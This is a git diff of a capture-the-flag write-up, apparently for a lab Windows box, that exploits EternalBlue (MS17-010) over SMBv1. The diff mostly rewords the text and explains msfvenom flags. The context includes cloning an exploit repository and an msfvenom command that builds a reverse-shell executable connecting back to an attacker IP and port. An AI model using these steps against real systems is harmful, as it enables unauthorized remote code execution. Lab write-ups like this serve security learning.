@@ -34,23 +34,29 @@ Breaking down the command above:
 
 ![](../.gitbook/assets/smb-vuln-legacy-results.png)
 
-The results of the script show that it is vulnerable to CVE-2008-4250 and CVE-2017-0143. Normally, RCE \(Remote Code Execution\) is prioritized over everything, but both CVE utilize RCE. The server is using SMBv1 and since the Risk Factor is high, I will be going with CVE-2017-0143 \(ms17-010\), otherwise known as EternalBlue.
+The results of the script show that it is vulnerable to CVE-2008-4250 and CVE-2017-0143. Normally, RCE \(Remote Code Execution\) is prioritized over everything, but both CVE utilize RCE. The server is using SMBv1 and since the Risk Factor is high, we will be going with CVE-2017-0143 \(ms17-010\), otherwise known as EternalBlue.
 
 ## Exploitation
 
 Eternal Blue is a vulnerability that exploited Microsoft's SMB protocol, where a specially crafted packet allowed an attacker to execute arbitrary code on the target machine.
 
-First, I must download an exploit. A good one to check out is:
+First, we must download an exploit. A good one to check out is:
 
 ```text
 git clone https://github.com/helviojunior/MS17-010.git
 ```
 
-Next, I will use msfvenom to generate a payload that will create a reverse shell on the Windows machine:
+Next, we will use msfvenom to generate a payload that will create a reverse shell on the Windows machine:
 
 ```text
 msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.95 LPORT=7777 -f exe > eternal.exe
 ```
+
+* **-p flag:** Payload type.
+* **LHOST:** Listening IP address of the attacking machine.
+* **LPORT:** Listening port of the attacking machine.
+* **-f flag:** File format of payload.
+* **-o flag:** Where to save the file as well as name the file.
 
 Then I will set up a listener on our attacking machine:
 
@@ -78,7 +84,7 @@ We can actually get the root and user flags very simply without any escalation n
 
 ### Enumerating User and Privileges
 
-To figure out what user I am and what are my privileges, I attempted `whoami`  and `echo %username%` only to fail.
+To figure out what user we are and what are our privileges, I attempted `whoami`  and `echo %username%` only to fail.
 
 Kali has a whoami executable \(to find, type `locate whoami.exe`\) located at /usr/share/windows-resources/binaries/whoami.exe and we can export this file to the Windows machine. Certutil.exe is not recognized on the Windows machine, which is the curl/wget equivalent to Linux so we cannot transfer files with the `python -m SimpleHTTPServer 80` command.
 
